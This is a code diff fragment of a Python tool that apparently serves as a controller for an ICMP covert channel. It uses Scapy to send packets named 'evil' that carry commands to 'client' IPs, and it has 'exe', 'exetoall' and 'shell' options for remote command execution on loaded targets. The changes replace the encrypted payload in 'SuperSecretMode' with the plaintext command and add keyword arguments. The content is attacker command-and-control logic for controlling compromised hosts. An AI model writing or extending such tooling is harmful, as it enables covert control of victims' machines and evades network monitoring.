@@ -108,7 +108,7 @@ def send_over_icmp(clientip, command, execute):
             clientcommand = "!!!00" + command
 
     if SuperSecretMode: 
-        evil = IP(dst=clientip)/ICMP(type=8)/(encrypted)
+        evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     else:
         evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
@@ -200,13 +200,13 @@ def main():
         elif arguments[0] == "removeallclients":
             removeallclients(clients)
         elif arguments[0] == "exe":
-            send_command(arguments, clients, True)
+            send_command(arguments, clients, execute=True)
         elif arguments[0] == "send":
-            send_command(arguments, clients, False)
+            send_command(arguments, clients, execute=False)
         elif arguments[0] == "exetoall":
-            sendtoall(arguments, clients, True)
+            sendtoall(arguments, clients, execute=True)
         elif arguments[0] == "sendtoall":
-            sendtoall(arguments, clients, False)
+            sendtoall(arguments, clients, execute=False)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
         elif arguments[0] == "shell":
